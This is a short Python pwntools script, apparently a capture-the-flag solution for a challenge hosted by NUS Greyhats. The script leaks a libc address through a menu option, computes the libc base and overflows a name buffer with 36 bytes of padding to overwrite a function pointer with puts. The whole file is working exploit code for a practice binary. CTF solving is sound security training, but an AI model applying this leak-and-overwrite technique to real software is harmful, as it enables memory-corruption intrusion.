from pwn import *
context.log_level = 'error'

def run():
    p = remote('challs.nusgreyhats.org', 31367)

    p.recvuntil(b'3. Make greycat talk\n')
    p.sendline(b'6767')
    libc_leak = int(p.recvline().strip(), 16)
    malloc_offset = 0xa50a0 # ubuntu 22.04
    libc_base = libc_leak - malloc_offset
    libc = ELF('libc_2.35.so', checksec=False)
    libc.address = libc_base

    puts = libc.sym['puts']

    # We call puts(name)
    payload = b'A' * 36 + p64(puts).strip(b'\x00')

    p.sendline(b'2')
    p.recvuntil(b'name:\n')
    p.sendline(payload)
    p.recvuntil(b'talk\n')

    p.sendline(b'3')
    p.recvuntil(b'index: \n')
    p.sendline(b'0')

    print("Output:")
    print(p.recvall(timeout=1))

run()
